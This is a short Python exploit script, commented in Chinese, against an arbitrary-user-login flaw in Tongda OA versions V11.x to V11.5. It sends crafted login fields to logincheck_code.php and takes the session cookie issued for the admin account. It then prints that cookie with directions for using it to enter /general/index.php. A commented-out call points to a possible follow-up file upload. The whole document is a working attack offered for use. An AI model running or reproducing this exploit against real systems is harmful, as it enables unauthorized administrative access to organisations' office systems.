import requests
def getV11Session(host): # 通达V11.x-V11.5任意用户登录获取cookie
    content = ''
    content += '[->] 正在尝试通达<V11.5任意用户登录获取cookie' + '\n'
    url = host + 'logincheck_code.php'
    try:
        data = {'UNAME':'admin','PASSWORD':'1111','encode_type':'1','UID':'1'}
        response = requests.post(url=url,data=data,timeout=2)
        # print(response.text[10])
        if response.text[10] == '1':
            content += '[*] 存在任意用户登录，cookie值如下: ' + '\n'
            cookie_key = response.cookies.keys()[0]  ## 拼接cookie
            cookie_value = response.cookies.values()[0]
            phpsession = cookie_key + '=' + cookie_value
            content += phpsession + '\r\n'
            content += '请修改cookie访问/general/index.php?isIE=0&modify_pwd=0' + '\n'
            print(content)
            return content
            # file_upload(host,phpsession)
        else:
            content += '[-] 不存在通达V11.x-V11.5任意用户登录漏洞' + '\n'
            print(content)
            return content
    except:
        pass

def run(host):
    getV11Session(host)
